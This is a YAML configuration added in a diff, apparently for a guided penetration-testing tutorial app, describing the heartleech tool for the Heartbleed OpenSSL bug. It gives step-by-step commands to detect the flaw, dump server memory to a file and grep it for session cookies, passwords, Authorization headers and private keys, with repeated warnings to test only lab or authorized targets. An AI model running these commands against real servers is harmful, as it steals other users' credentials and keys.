@@ -1,0 +1,168 @@
+tool_id: heartleech
+display_name: "heartleech"
+binary_candidates: [heartleech]
+categories: [web_app, exploitation]
+os_profile: kali
+one_liner: "Tests a TLS service for Heartbleed (CVE-2014-0160) and can dump leaked server memory."
+authorization_gate: true
+authorization_text: >
+  heartleech actively exploits the Heartbleed bug to read a server's private memory (which can
+  include keys, cookies and passwords). Doing this to systems you don't own or aren't authorized
+  to test is a serious crime. Continue only on your own lab (e.g. an old OpenSSL 1.0.1 VM) or an
+  authorized target. Continue?
+flows:
+  - flow_id: guided
+    title: "Guided test (START HERE)"
+    goal: "Confirm a TLS service, check it for Heartbleed, dump memory, and search it — safely."
+    command_builder_id: heartleech
+    slots: [PROGRAM, ACTION_OPTIONS, OUTPUT_OPTIONS, POSITIONAL_ARGS]
+    steps:
+      - step_id: g1
+        title: "Find a TLS service you're authorized to test"
+        slot_target: null
+        glossary_refs: []
+        explanation:
+          what: "Heartbleed affects OpenSSL 1.0.1 TLS services (HTTPS on 443, but also mail/VPN TLS ports). You need a hostname/IP running such a service."
+          why: "Heartbleed is old, so you'll usually practise against a deliberately vulnerable lab VM. Confirm the port speaks TLS first."
+          where: "The hostname is the last argument to heartleech; the port is -p."
+        find_it: >
+          Only test your own lab or an authorized target. Spin up a known-vulnerable VM (old
+          OpenSSL 1.0.1). Confirm a TLS port with nmap and even pre-check with its script:
+          `nmap -p 443 --script ssl-heartbleed TARGET`. Install heartleech with
+          `sudo apt install heartleech` if needed.
+        command_anatomy:
+          - {token: "nmap -p 443", does: "check port 443"}
+          - {token: "--script ssl-heartbleed", does: "nmap's own Heartbleed check"}
+          - {token: "TARGET", does: "your authorized host"}
+        try_this: "nmap -p 443 --script ssl-heartbleed TARGET"
+        success_criteria: "Port 443 is open/TLS; the script says VULNERABLE (on your lab target) or not."
+        expected_output: |
+          PORT    STATE SERVICE
+          443/tcp open  https
+          | ssl-heartbleed:
+          |   VULNERABLE:
+          |_  The Heartbleed Bug is a serious vulnerability (CVE-2014-0160)
+        alternatives:
+          - trigger: "port closed / not TLS"
+            cause: "Wrong host or port."
+            fix: "Find the TLS port with `nmap -sV TARGET` and use that with -p."
+            check: "nmap shows an open TLS service."
+      - step_id: g2
+        title: "Scan for Heartbleed with heartleech"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "`heartleech --scan <host>` sends a single crafted heartbeat and reports whether the server is vulnerable — it does NOT dump data yet."
+          why: "A non-invasive confirmation before you extract anything."
+          where: "ACTION_OPTIONS (--scan); host is positional; -p sets a non-443 port."
+        find_it: "Use the host from step 1. Add `-p <port>` if it isn't 443."
+        command_anatomy:
+          - {token: "heartleech", does: "the tool"}
+          - {token: "--scan", does: "just test for the bug (no data extraction)"}
+          - {token: "TARGET", does: "the host to test"}
+        try_this: "heartleech --scan TARGET"
+        success_criteria: "It reports the target VULNERABLE or SAFE."
+        expected_output: |
+          [ TARGET:443 ]
+          [+] VULNERABLE
+        alternatives:
+          - trigger: "connection errors / timeouts"
+            cause: "Firewall, wrong port, or TLS not on that port."
+            fix: "Confirm the TLS port (nmap -sV) and pass it with -p; check reachability."
+            check: "heartleech connects and reports a verdict."
+      - step_id: g3
+        title: "Dump leaked memory (authorized targets only)"
+        slot_target: OUTPUT_OPTIONS
+        destructive: true
+        recovery: >
+          --dump reads the server's private memory, which can contain other users' data, session
+          cookies and private keys. This is real exploitation — only against your own lab or an
+          explicitly authorized target. Store the dump securely and delete it when done.
+        explanation:
+          what: "`heartleech <host> -p 443 --dump <file>` repeatedly leaks ~64 KB chunks of server memory into a file until you stop it (Ctrl-C)."
+          why: "This is the actual impact of Heartbleed — showing how a simple bug exposes secrets. You then search the dump (next step)."
+          where: "OUTPUT_OPTIONS (--dump); host positional; -p port."
+        find_it: "Pick a writable output path (your home). Let it run a little while to gather enough memory, then Ctrl-C."
+        command_anatomy:
+          - {token: "heartleech", does: "the tool"}
+          - {token: "TARGET -p 443", does: "the authorized host and TLS port"}
+          - {token: "--dump ~/bleed.bin", does: "write leaked memory to this file"}
+        try_this: "heartleech TARGET -p 443 --dump ~/bleed.bin"
+        success_criteria: "The file grows as memory is leaked; ~/bleed.bin exists after you stop it."
+        expected_output: |
+          [+] VULNERABLE
+          [+] dumping memory to ~/bleed.bin
+          [+] 1.2 MB received ...
+        alternatives:
+          - trigger: "file stays empty"
+            cause: "Server not actually vulnerable, or connection dropped."
+            fix: "Re-confirm with --scan; ensure the port is the TLS one."
+            check: "The dump file grows."
+      - step_id: g4
+        title: "Search the dump for secrets"
+        slot_target: null
+        explanation:
+          what: "`strings` pulls readable text out of the binary dump; grep filters for interesting patterns like cookies, passwords, or a private key header."
+          why: "This shows what actually leaked — the point of the exercise — and how to triage a memory dump."
+          where: "Post-processing the dumped file."
+        find_it: "Use the dump file from step 3. Interesting patterns: 'Cookie', 'password', 'Authorization', '-----BEGIN'."
+        command_anatomy:
+          - {token: "strings ~/bleed.bin", does: "extract readable text from the binary dump"}
+          - {token: "| grep -iE 'cookie|password|BEGIN'", does: "filter for likely secrets"}
+        try_this: "strings ~/bleed.bin | grep -iE 'cookie|password|authorization|BEGIN'"
+        success_criteria: "Leaked strings (session cookies, credentials, or key headers) appear."
+        expected_output: |
+          Cookie: session=8f3a...; user=admin
+          Authorization: Basic YWRtaW46cGFzcw==
+          -----BEGIN RSA PRIVATE KEY-----
+        alternatives:
+          - trigger: "nothing interesting found"
+            cause: "The captured memory happened not to hold secrets yet."
+            fix: "Leak more (re-run --dump for longer while the app is in use), then search again."
+            check: "A larger dump yields readable secrets."
+  - flow_id: scan
+    title: "Scan only (reference)"
+    goal: "Non-invasive vulnerability check."
+    command_builder_id: heartleech
+    slots: [PROGRAM, ACTION_OPTIONS, POSITIONAL_ARGS]
+    steps:
+      - step_id: hl1
+        title: "heartleech --scan"
+        slot_target: ACTION_OPTIONS
+        explanation:
+          what: "`heartleech --scan <host>` reports vulnerable/safe without dumping."
+          why: "Safe confirmation step."
+          where: "ACTION_OPTIONS (--scan)."
+        find_it: "An authorized TLS host; -p for non-443."
+        command_anatomy:
+          - {token: "--scan TARGET", does: "test the host for Heartbleed only"}
+        try_this: "heartleech --scan TARGET"
+        success_criteria: "A VULNERABLE/SAFE verdict prints."
+        expected_output: |
+          [+] VULNERABLE
+        alternatives:
+          - trigger: "cannot connect"
+            cause: "Wrong port/host."
+            fix: "Find the TLS port with nmap -sV; use -p."
+            check: "A verdict prints."
+
+quick_build:
+  builder: heartleech
+  title: "Quick test"
+  fields:
+    - field_id: target
+      label: "Target host"
+      type: string
+      required: true
+      placeholder: "10.0.0.20  or  vuln.lab"
+    - field_id: port
+      label: "TLS port (-p)"
+      type: int
+      placeholder: "443"
+    - field_id: scan
+      label: "Scan only (--scan)"
+      type: bool
+      default: true
+    - field_id: dump
+      label: "Dump memory to file (--dump)"
+      type: path
+      placeholder: "~/bleed.bin  (authorized only)"
